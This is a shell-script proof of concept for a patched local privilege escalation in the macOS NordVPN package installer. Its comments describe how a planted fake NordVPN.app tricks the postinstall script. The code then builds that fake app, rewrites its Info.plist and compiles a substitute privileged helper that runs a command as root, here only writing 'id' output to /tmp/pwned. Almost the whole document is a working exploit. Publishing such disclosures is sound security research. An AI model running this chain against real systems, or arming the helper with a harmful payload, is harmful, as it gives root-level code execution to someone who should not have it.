# PoC for a LPE in macOS NordVPN installation process.
#  (fixed with version 8.17)
#
# Author:        p1tsi
# Description:   When installing NordVPN with the downloadable .pkg file, it is possible to exploit
#                the 'postinstall' script to hijack 'com.nordvpn.macos.helper' privileged helper.
#                The trick is that when installing the app, if inside '/Applications' folder there is
#                an app named 'NordVPN.app' with a different bundle identifier in its Info.plist,
#                the legitimate app will be placed at '/Applications/NordVPN.localized/NordVPN.app'.
#                Nonetheless, the privileged helper to be copied inside '/Library/PrivilegedHelperTools/'
#                will be taken from '/Applications/NordVPN.app/...' instead of '/Applications/NordVPN.localized/...'
#
# Fix:           Cleanup of the environment in the 'preinstall' script 
#

FAKE_APP="/Applications/NordVPN.app"

# Assume the environment is clean
#cleanup() {
#    sudo launchctl unload com.nordvpn.macos.helper.plist
#    sudo rm -rf /Library/LaunchDaemons/com.nordvpn.macos.helper.plist
#    sudo rm -rf /Library/PrivilegedHelperTools/com.nordvpn.macos.helper
#    sudo rm -rf "${FAKE_APP}"
#    sudo rm -rf /Library/PrivilegedHelperTools/com.nordvpn.macos.helper
#    sudo rm -rf /Applications/NordVPN.localized/
#}

#echo "[+] Cleanup"
#cleanup

echo "[+] Preparing fake app..."
osacompile -o "${FAKE_APP}" -e 'do shell script "id > /tmp/pwned"'

echo "[+] Adjusting Info.plist..."
/usr/libexec/PlistBuddy -c "Add :CFBundleIdentifier string" "${FAKE_APP}/Contents/Info.plist"
/usr/libexec/PlistBuddy -c "Set :CFBundleIdentifier com.nordvpn.macos.fake" "${FAKE_APP}/Contents/Info.plist"
/usr/libexec/PlistBuddy -c "Set :CFBundleName NordVPN" "${FAKE_APP}/Contents/Info.plist"
/usr/libexec/PlistBuddy -c "Add :CFBundleVersion string" "${FAKE_APP}/Contents/Info.plist"
/usr/libexec/PlistBuddy -c "Set :CFBundleVersion 262" "${FAKE_APP}/Contents/Info.plist"
/usr/libexec/PlistBuddy -c "Add :CFBundleShortVersionString string" "${FAKE_APP}/Contents/Info.plist"
/usr/libexec/PlistBuddy -c "Set :CFBundleShortVersionString 8.14.6" "${FAKE_APP}/Contents/Info.plist"

echo "[+] Adding fake helper"
mkdir -p "${FAKE_APP}/Contents/Library/LaunchServices/"

echo "

#include <stdlib.h>

int main(){
    system(\"id > /private/tmp/pwned\");
    return 0;
}

" > /private/tmp/spawn_terminal.c
gcc -o "${FAKE_APP}/Contents/Library/LaunchServices/com.nordvpn.macos.helper" /private/tmp/spawn_terminal.c
rm /private/tmp/spawn_terminal.c


echo "[+] Installing real NordVPN application"
sudo installer -package ~/Downloads/NordVPN.pkg -target /
